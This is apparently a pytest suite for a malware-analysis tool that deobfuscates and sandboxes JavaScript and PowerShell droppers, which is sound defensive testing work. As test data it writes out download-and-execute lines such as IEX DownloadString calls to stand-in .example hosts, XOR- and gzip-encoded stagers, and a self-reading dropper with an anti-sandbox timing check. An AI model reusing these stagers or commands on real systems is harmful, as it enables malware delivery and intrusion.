"""Obfuscation techniques: static detectors, sandbox instrumentation and events."""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

from docutracex.parsers import javascript as J
from docutracex.parsers import js_techniques as jt


def _sample() -> str:
    spec = importlib.util.spec_from_file_location(
        "ms", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms.obf_techniques_js().decode("utf-8")


def _have_v8() -> bool:
    try:
        import STPyV8  # noqa: F401
        return True
    except Exception:  # noqa: BLE001
        return False


def test_static_techniques_on_sample() -> None:
    code = _sample()
    ids = {t["id"]: t for t in jt.static_techniques(code, J.metrics(code)["obfuscation_score"])}
    assert set(ids) == {"arithmetic_literals", "escape_block", "xor_decryptor", "iife_string",
                        "fromcharcode_arith", "payload_key_decryptor", "fake_header"}
    assert ids["escape_block"]["variable"] == "_0xa"
    assert ids["payload_key_decryptor"]["key"] == "Fact2024" and ids["payload_key_decryptor"]["decryptor"] == "dec"
    assert all(t["phase"] == "static" for t in ids.values())


def test_clean_code_has_no_techniques() -> None:
    code = "/* jQuery v3 */\nfunction add(a, b) { return a + b; }\nvar x = add(1, 2);\n"
    assert jt.static_techniques(code, 0) == []


def test_instrument_wraps_declared_xor_functions() -> None:
    code = "function d(a,k){var o='';for(var i=0;i<a.length;i++){o+=String.fromCharCode(a[i]^k.charCodeAt(i%k.length));}return o;}"
    out = jt.instrument(code)
    assert out.endswith(code) and "_dtx_log('xor','d'" in out


def test_from_sandbox_events() -> None:
    sb = {"log": [
        {"kind": "call", "name": "WScript.Sleep", "args": ["15000"]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "fromcharcode", "name": "String.fromCharCode", "args": ["WScript"]},
        {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]},
    ]}
    ids = {t["id"]: t for t in jt.from_sandbox(sb)}
    assert {"antisandbox_timing", "fromcharcode_resolved", "xor_resolved", "dropped_payload"} <= set(ids)
    assert "15000" in ids["antisandbox_timing"]["evidence"]
    assert ids["dropped_payload"]["payload"].startswith("powershell")
    assert all(t["phase"] == "sandbox" for t in ids.values())


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_sample_end_to_end(tmp_path: Path) -> None:
    f = tmp_path / "s.js"
    f.write_text(_sample(), encoding="utf-8")
    res = J.analyze(f, tmp_path, {})
    sc = res["scripts"][0]
    phases = {t["id"]: t["phase"] for t in sc["techniques"]}
    assert phases["payload_key_decryptor"] == "static" and phases["dropped_payload"] == "sandbox"
    assert "billing-portal.example" in next(t for t in sc["techniques"] if t["id"] == "dropped_payload")["payload"]
    rules = {x["rule"] for x in res["findings"]}
    assert {"js_dropped_payload", "js_antisandbox_timing", "js_payload_key_decryptor"} <= rules


def _ms():
    spec = importlib.util.spec_from_file_location(
        "ms2", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms


def test_ps_xor_deflate_stager_resolves_to_final_stage() -> None:
    from docutracex.parsers import ps_deobf
    r = ps_deobf.deobfuscate(_ms().xor_stager_ps1().decode())
    assert {"xor-base64", "xor-char-array", "decompress"} <= set(r["methods"])
    assert "DownloadString('http://billing-portal.example/inv/stage4.ps1')" in r["code"]
    assert "'http://billing-portal.example/inv/beacon'" in r["code"]


def test_ps_gzip_inline_and_numeric_key() -> None:
    import base64
    import zlib
    from docutracex.parsers import ps_deobf
    final = "Start-Process calc.exe"
    c = zlib.compressobj(9, zlib.DEFLATED, 31)
    b = base64.b64encode(c.compress(final.encode()) + c.flush()).decode()
    cmd = ("IEX (New-Object IO.StreamReader((New-Object IO.Compression.GZipStream([IO.MemoryStream]"
           f"[Convert]::FromBase64String('{b}'),[IO.Compression.CompressionMode]::Decompress)),"
           "[Text.Encoding]::ASCII)).ReadToEnd()")
    assert ps_deobf.deobfuscate(cmd)["code"].strip() == final
    x = base64.b64encode(bytes(ch ^ 0x41 for ch in final.encode())).decode()
    loop = f"$d = [Convert]::FromBase64String('{x}'); foreach ($i in 0..($d.Length-1)) {{ $d[$i] = $d[$i] -bxor 0x41 }}"
    assert final in ps_deobf.deobfuscate(loop)["code"]


def test_binary_base64_is_not_turned_into_garbage() -> None:
    import base64
    import random
    from docutracex.parsers import ps_deobf
    rnd = random.Random(1234)
    for _ in range(50):
        b = base64.b64encode(bytes(rnd.randrange(256) for _ in range(64))).decode()
        cmd = f"$x = [Convert]::FromBase64String('{b}')"
        assert ps_deobf.deobfuscate(cmd)["code"] == cmd


@pytest.fixture()
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    from fastapi.testclient import TestClient
    from docutracex.app import create_app
    from docutracex.config import settings
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    return TestClient(create_app())


def _analyze(client, name: str, data: bytes) -> tuple[str, Path]:
    import time
    from docutracex.config import settings
    r = client.post("/api/cases", files={"file": (name, data)}).json()
    tid = r["task"]["id"]
    for _ in range(1200):
        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.05)
    return r["analysis_id"], settings.cases_dir / r["analysis_id"] / "results"


def _tree(results: Path) -> list[dict]:
    import json
    return json.loads((results / "nested.json").read_text())["tree"]


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_chain_js_vbs_powershell_as_nested(client) -> None:
    import json
    _, res = _analyze(client, "sample_chain_dropper.js", _ms().chain_dropper_js())
    tree = _tree(res)
    vbs = next(n for n in tree if n["filename"].endswith(".vbs"))
    assert vbs["decrypted_from"].startswith("JavaScript") and vbs["kind"] == "script"
    assert {"vbscript", "powershell"} <= set(vbs["code"])           # re-analysed by both
    assert {"vbs_shell", "ps_download"} <= {f["rule"] for f in vbs["findings"]}
    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
    assert "http://billing-portal.example/inv/stage4.ps1" in iocs  # the final stage


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_decrypted_stages_are_followed_recursively(client) -> None:
    def xor_js(payload: str, key: str = "k3y") -> str:
        arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
        return (f'var k = "{key}";\nvar d = [{arr}];\n'
                "function dec(a, key) { var o = ''; for (var i = 0; i < a.length; i++) "
                "{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); } return o; }\n"
                "var fso = new ActiveXObject('Scripting.FileSystemObject');\n"
                "fso.CreateTextFile('s.tmp', true).Write(dec(d, k));\n")
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/deep.ps1')"
    stage2 = xor_js(ps, "two")                 # JS that decrypts PowerShell
    stage1 = xor_js(stage2, "one")             # JS that decrypts stage2
    _, res = _analyze(client, "deep.js", stage1.encode())
    js2 = next(n for n in _tree(res) if n["filename"].endswith(".js"))
    assert js2["decrypted_from"]
    ps1 = next(n for n in js2["children"] if n["filename"].endswith(".ps1"))
    assert ps1["decrypted_from"] and "ps_download" in {f["rule"] for f in ps1["findings"]}


def test_decrypted_payloads_and_sniffing(tmp_path: Path) -> None:
    import base64
    from docutracex import decrypted
    assert decrypted.sniff_ext("powershell -nop -enc AAAA") == ".ps1"
    assert decrypted.sniff_ext('Dim a\r\nSet a = CreateObject("WScript.Shell")') == ".vbs"
    assert decrypted.sniff_ext("var a = 1; new ActiveXObject('x');") == ".js"
    assert decrypted.sniff_ext("@echo off\r\nset x=1") == ".bat"
    pe = b"MZ" + b"\x90" * 300 + b"This program cannot be run in DOS mode (inert stub)"
    mods = {
        "javascript": {"scripts": [{"location": "a.js", "sandbox": {"log": [
            {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]}]}}]},
        "powershell": {"scripts": [{"location": "b.ps1",
                                    "code": f"$x = '{base64.b64encode(pe).decode()}'"}]},
    }
    got = decrypted.payloads_from(mods)
    assert {p["how"] for p in got} == {"js-xor-dec", "powershell-base64"}
    items = decrypted.write(got, tmp_path / "decrypted")
    names = sorted(i["filename"] for i in items)
    assert names[0].endswith(".ps1") and names[1].endswith(".exe")
    assert (tmp_path / "decrypted" / names[1]).read_bytes() == pe


def test_timeout_factor_and_webcrack_gate() -> None:
    from docutracex import config
    from docutracex.parsers.js_webcrack import needs_webcrack
    assert config.tmo(15) == round(15 * config.TIMEOUT_FACTOR)
    assert needs_webcrack(_ms().obf_obfuscatorio_js().decode("utf-8", "replace"))
    assert not needs_webcrack(_sample()) and not needs_webcrack("var a = 1; WScript.Echo(a);")


def test_js_scripts_report_progress(tmp_path: Path) -> None:
    from docutracex import analyze
    events: list[tuple[str, dict]] = []
    html = "".join(f"<script>var a{i} = {i}; document.write('x{i}');</script>" for i in range(5))
    f = tmp_path / "p.html"
    f.write_text(f"<html><body>{html}</body></html>", encoding="utf-8")
    analyze.set_step_listener(lambda ev, rec: events.append((ev, rec)))
    try:
        analyze._notify_step("start", {"step": "javascript: x"})
        res = J.analyze(f, tmp_path / "none", {})
    finally:
        analyze.set_step_listener(None)
    details = [r["detail"] for e, r in events if e == "progress"]
    n = len(res["scripts"])
    assert n >= 2 and details[0] == f"script 0/{n}" and details[-1] == f"script {n}/{n}"
    assert [s["id"] for s in res["scripts"]] == sorted(s["id"] for s in res["scripts"])   # order kept


def test_escape_block_detector_is_linear_on_cut_strings() -> None:
    """A script cut at a size limit leaves a string literal open: the escape
    block detector must not backtrack exponentially (it hung for 10+ min)."""
    import time
    code = 'var x = 1;\nvar blob = "' + "\\x41\\x42" * 60000          # never closed
    t = time.perf_counter()
    jt.static_techniques(code, 6)
    assert time.perf_counter() - t < 5


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_wsh_emulation_self_read_drop_and_virtual_clock() -> None:
    code = ('var t0 = new Date().getTime(); WScript.Sleep(5000);'
            'if (new Date().getTime() - t0 < 4000) { WScript.Quit(); }'
            'var fso = WScript.CreateObject("Scripting.FileSystemObject");'
            'var me = fso.OpenTextFile(WScript.ScriptFullName, 1).ReadAll();'
            'var p = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + "\\\\x.ps1";'
            'var f = fso.CreateTextFile(p, true); f.Write(me.substring(me.lastIndexOf("//P:") + 4)); f.Close();'
            '//P:Write-Host invoice')
    sb = J.sandbox(code)
    assert sb["error"] is None, sb["error"]
    drops = [e for e in sb["log"] if e["kind"] == "drop"]
    assert drops and drops[0]["name"].endswith("\\x.ps1") and "Temp" in drops[0]["name"]
    assert drops[0]["args"][0] == "Write-Host invoice"          # read its own source
    assert not any(e["name"] == "WScript.Quit" for e in sb["log"])  # passed the Sleep/clock check


def test_ps_var_xor_hex_helper_and_leading_zeros() -> None:
    from docutracex.parsers import ps_deobf
    t = "IEX 'http://billing-portal.example/a'"
    arr = ",".join(f"{ord(c) ^ 70:03d}" for c in t)
    code = (f"$r1=@({arr})\n$rk1=070\n$rs1=-join($r1|ForEach-Object{{[char]([int]$_-bxor$rk1)}})\n"
            "$h = { param($x) $o=New-Object Text.StringBuilder; $i=0; while($i-lt$x.Length){ "
            "[void]$o.Append([char][Convert]::ToInt32($x.Substring($i,2),16)); $i+=2 } $o.ToString() }\n"
            "$s = & $h '5363686564756C652E53657276696365'")
    r = ps_deobf.deobfuscate(code)
    assert {"xor-var-array", "hex-helper"} <= set(r["methods"])
    assert "http://billing-portal.example/a" in r["code"] and "'Schedule.Service'" in r["code"]


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_wsh_selfread_sample_end_to_end(client) -> None:
    import json
    _, res = _analyze(client, "sample_wsh_selfread.js", _ms().wsh_selfread_dropper_js())
    js = json.loads((res / "javascript.json").read_text())
    assert js["scripts"][0]["sandbox"]["error"] is None
    assert {"js_sandbox_command", "js_antisandbox_timing"} <= {f["rule"] for f in js["findings"]}
    ps1 = next(n for n in _tree(res) if n["filename"].endswith(".ps1"))
    assert {"ps_download", "ps_iex"} <= {f["rule"] for f in ps1["findings"]}
    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
    assert "http://billing-portal.example/inv/stage5.ps1" in iocs
    assert not any("downloads\\invoice.js" in v.lower() for v in iocs)   # emulator artefact


def test_rerun_does_not_reanalyse_own_outputs(client) -> None:
    """extracted/code (dumps) and extracted/stages are the app's own output: a
    re-run must not collect them back as new scripts of the sample."""
    import json
    cid, res = _analyze(client, "sample_obf_techniques.js", _ms().obf_techniques_js())
    first = len(json.loads((res / "javascript.json").read_text())["scripts"])
    tid = client.post(f"/api/cases/{cid}/rerun", json={"module": "full"}).json()["task"]["id"]
    import time
    for _ in range(1200):
        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.05)
    assert len(json.loads((res / "javascript.json").read_text())["scripts"]) == first == 1


def test_rerun_does_not_duplicate_decrypted_stages(client) -> None:
    import json
    import time
    cid, res = _analyze(client, "sample_chain_dropper.js", _ms().chain_dropper_js())
    before = [n["filename"] for n in _tree(res)]
    tid = client.post(f"/api/cases/{cid}/rerun", json={"module": "full"}).json()["task"]["id"]
    for _ in range(1200):
        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.05)
    assert [n["filename"] for n in _tree(res)] == before and len(before) == len(set(before))


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_nested_scripts_surface_in_code_tabs(client) -> None:
    """The .ps1 a dropper writes is analysed as a nested child AND shown in the
    PowerShell tab with its full analysis (once, also after a re-run)."""
    import json
    import time
    cid, res = _analyze(client, "sample_wsh_selfread.js", _ms().wsh_selfread_dropper_js())
    ps = json.loads((res / "powershell.json").read_text())
    nested_ps = [s for s in ps["scripts"] if s.get("from_nested")]
    assert len(nested_ps) == 1 and nested_ps[0]["origin"].startswith("nested › decrypted_js-drop_")
    assert {"xor-var-array", "hex-helper"} <= set(nested_ps[0]["deob_methods"])
    assert {"ps_persist", "ps_scriptblock"} <= {h["rule"] for h in nested_ps[0]["hits"]}
    tid = client.post(f"/api/cases/{cid}/rerun", json={"module": "full"}).json()["task"]["id"]
    for _ in range(1200):
        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.05)
    ps = json.loads((res / "powershell.json").read_text())
    assert len([s for s in ps["scripts"] if s.get("from_nested")]) == 1


def test_ps_rules_reflective_hollowing_task_wmi() -> None:
    from docutracex.parsers import script_rules
    code = "\n".join([
        "$d=[AppDomain]::CurrentDomain; if($m.ReturnType -eq [Reflection.Assembly]){}",
        '$h = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"',
        "$s = New-Object -ComObject 'Schedule.Service'; $f.RegisterTask('\\x', $xml, 6)",
        "$rc=[scriptblock]::Create($rs)",
        "Invoke-CimMethod -ClassName Win32_Process -MethodName Create",
    ])
    rules = {h["rule"] for h in script_rules.scan(code, script_rules.PS)}
    assert {"ps_reflection_load", "ps_hollow_host", "ps_persist", "ps_scriptblock", "ps_wmi_exec"} <= rules


def test_nested_child_views(client) -> None:
    """Every nested child with its own analysis gets a view served like a case
    (its modules, findings with a source, IOCs, its own children)."""
    import json
    from pathlib import Path as _P
    eml = _P(__file__).resolve().parents[1] / "samples" / "sample.eml"
    if not eml.is_file():
        pytest.skip("samples not unpacked")
    cid, res = _analyze(client, "sample.eml", eml.read_bytes())
    tree = _tree(res)
    rtf = next(n for n in tree if n["kind"] == "rtf")
    assert rtf["view_id"] and "rtf" in rtf["view_modules"]
    v = client.get(f"/api/cases/{cid}/nested/{rtf['view_id']}/components").json()
    assert v["nested_view"] and v["filename"] == rtf["filename"] and "rtf" in v["modules"]
    assert v["findings"] and all(f["source"] for f in v["findings"])
    assert len(v["modules"]["nested"]["tree"]) == len(rtf["children"])        # its own children
    deep = rtf["children"][0]
    assert client.get(f"/api/cases/{cid}/nested/{deep['view_id']}/components").status_code == 200
    office = next((n for n in tree if n["kind"] == "ooxml"), None)
    if office:
        ov = client.get(f"/api/cases/{cid}/nested/{office['view_id']}/components").json()
        assert any(k in ov["modules"] for k in ("word", "excel", "powerpoint"))
    assert client.get(f"/api/cases/{cid}/nested/nope/components").status_code == 400
    assert client.get(f"/api/cases/{cid}/nested/{'0' * 16}-000000/components").status_code == 404
    views = sorted(p.name for p in (res / "nested_views").glob("*.json"))
    assert len(views) == len({n["view_id"] for n in tree if n.get("view_id")}
                             | {c["view_id"] for n in tree for c in n.get("children") or [] if c.get("view_id")})


def test_classify_decoded_bytes() -> None:
    import base64
    import gzip
    from docutracex import decrypted as d
    pe = b"MZ" + b"\x90" * 300
    assert d.classify(pe, "x", "o")["ext"] == ".exe"
    inflated = d.classify(gzip.compress(b"server=http://billing-portal.example/c2 interval=3600"), "x", "o")
    assert inflated["text"].startswith("server=") and inflated["how"].endswith("inflated")
    assert d.classify(gzip.compress(pe), "x", "o")["ext"] == ".exe"           # file inside gzip
    import random
    rnd = random.Random(1)
    blob = bytes(rnd.randrange(256) for _ in range(600))
    assert d.classify(blob, "x", "o")["ext"] == ".bin"
    assert d.classify(blob[:100], "x", "o") is None                           # too small to matter
    assert d.classify(b"hi", "x", "o") is None


def test_resolved_literals_only_count_as_files() -> None:
    """A literal the deobfuscator already resolved (gone from the analysed
    code) only becomes a child when it is a FILE; still-encoded literals always."""
    import base64
    import random
    from docutracex import decrypted as d
    rnd = random.Random(2)
    blob = base64.b64encode(bytes(rnd.randrange(256) for _ in range(600))).decode()
    pe = base64.b64encode(b"MZ" + bytes(range(256)) + b"This program cannot be run in DOS mode.").decode()
    sc = {"code_is_deobfuscated": True, "location": "x.ps1",
          "_full_code": f"$a='{blob}'\n$p='{pe}'\n$c='{blob[::-1]}'",
          "_full_deob": f"$a = <# decrypted #> 'Write-Host hi'\n$p = <# decoded #> 'MZ...'\n$c='{blob[::-1]}'"}
    hows = sorted(p["how"] for p in d.payloads_from({"powershell": {"scripts": [sc]}}))
    assert hows == ["powershell-base64", "powershell-base64-blob"]     # the PE (resolved) + the still-encoded blob


def test_encoded_blobs_sample_end_to_end(client) -> None:
    import json
    _, res = _analyze(client, "sample_encoded_blobs.ps1", _ms().encoded_blobs_ps1())
    kids = {n["filename"].rsplit(".", 1)[-1]: n for n in _tree(res)}
    assert {"ini", "bin", "exe"} <= set(kids)
    assert kids["bin"]["entropy"] > 7 and kids["exe"]["kind"] == "binary"
    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
    assert "http://billing-portal.example/inv/c2" in iocs
